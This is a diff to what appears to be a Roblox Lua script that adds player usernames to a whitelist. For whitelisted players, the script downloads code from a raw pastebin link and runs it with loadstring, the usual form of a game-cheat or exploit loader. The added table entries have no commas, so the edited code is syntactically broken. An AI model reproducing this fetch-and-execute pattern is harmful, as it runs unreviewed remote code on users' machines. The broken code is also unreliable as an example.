@@ -101,6 +101,17 @@ whitelist = {
 "SLYXCLTMKKGk",
 "zbcnmb",
 "cheems070828"
+"zjpndjfkz"
+"jinyan0729"
+"fl92828"
+"xuanhan_jie"
+"yjyyyds_2022"
+"1234dxh35"
+"yhhdhda"
+"yhhdsdh"
+"qqqqqqpppuo"
+"sksjlsnk"
+"Rakky110409"
 }
 if table.find(whitelist, game.Players.LocalPlayer.Name) then
    loadstring(game:HttpGet("https://pastebin.com/raw/3yQEUQY0"))()
